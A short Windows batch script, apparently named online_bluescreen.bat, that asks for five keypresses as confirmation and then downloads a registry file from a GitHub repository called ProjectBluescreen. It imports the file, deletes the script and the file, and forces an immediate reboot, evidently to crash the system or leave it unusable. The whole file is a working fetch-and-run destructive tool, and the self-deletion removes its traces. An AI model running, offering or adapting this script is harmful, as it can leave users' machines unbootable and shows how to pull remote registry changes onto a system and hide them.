%echo off
echo Press any key 5 times to confirm you want this device to possibly become unusable.
pause
pause
pause
pause
pause
powershell /c Invoke-WebRequest https://raw.githubusercontent.com/ProjectBluescreen/BlueScreen/main/temp.REG -OutFile temp.REG
temp.REG
del online_bluescreen.bat
del temp.REG
shutdown -r -t 0
